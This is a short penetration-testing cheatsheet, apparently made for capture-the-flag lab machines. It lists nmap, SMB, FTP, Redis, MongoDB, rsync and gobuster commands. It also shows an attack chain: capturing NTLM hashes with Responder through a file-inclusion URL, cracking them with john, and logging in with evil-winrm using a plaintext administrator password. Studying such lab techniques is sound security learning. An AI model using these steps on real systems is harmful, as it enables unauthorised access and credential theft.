# cheatsheet

## Dictionary
* wordlists
  ```sudo apt install wordlists```
* seclists
  ```sudo apt install seclists```
  * dir: /usr/share/seclists/Discovery/Web-Content/common.txt
  * sub-domain: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

## Nmap
  ```shell
  sudo nmap -sV {IP}
  ```
  * if -sV not always enough, try -sC to run safe script for more version info.
  ```shell
  sudo nmap -sC {IP}
  ```
  
  ```shell
  sudo nmap -sT 10.129.107.120 -top-ports 1000 -d
  ```

  * all ports range, or specific ports, min-rate specific min send packets per sec.
  ```shell
  sudo nmap -p- --min-rate=1000 -sV {IP}
  ```

## Telnet
  ```shell
  telnet open {IP}
  ```

## FTP
* Press Entry button if password is null
  ```shell
  ftp anonymous@{IP}
  ```

## SMB
```shell
smbclient -L {IP}
```
```shell
smbclient \\\\{IP}\\{DIR}
```
### NTLM Challange/Responder
* Use tool: Responder, acting a authentication server to collect hash string where target machine send to.
```shell
git clone https://github.com/lgandx/Responder
sudo python3 Responder.py -I tun0
w3m http://unika.htb/index.php?page=//{LOCAL IP}/somefile
```
* Wordlists at /usr/share/wordlists
```shell
sudo apt install wordlists
```
* John, which is a brute force pwd cracking tool
* use wordlists referred above and hash.txt which generated by Responder
```shell
john -w=/usr/share/wordlists/rockyou.txt.gz hash.txt
```


## Redis
* see all info
```shell
info
```
* see server info
```shell
info server
```
```shell
select {db}
```
```shell
keys *
```
```shell
dbsize
```

## RDP
### GUI RDP
```shell
xfreerdp3 /v:{HOST} /u:{USERNAME}
```
### SHELL RDP
```shell
evil-winrm  -i 10.129.95.234 -u administrator -p badminton
```

## WEB
* wordlist
```shell
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
gobuster
gobuster dir -u 10.129.70.58 -w wordlist.txt
```

* binding host
```shell
echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
```

## MongoDB
```shell
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
```
```shell
./mongosh mongodb://{IP}:{PORT}
show dbs;
show tables;
db.{TALBENAME}.find().pretty()
```

## Rsync
* default port 873
```shell
rsync --list-only {IP}::public
```
```shell
rsync {IP}::public/flag.txt flag.txt
```

## Kali RDP
```shell
#!/bin/bash
sudo apt -y update
sudo apt -y install kali-desktop-xfce xrdp
sudo systemctl enable xrdp
sudo systemctl restart xrdp
# setting the password for the kali user so you can login to the desktop. 
# Reset this once you have logged in.
echo 'kali:kali' | sudo chpasswd    
```
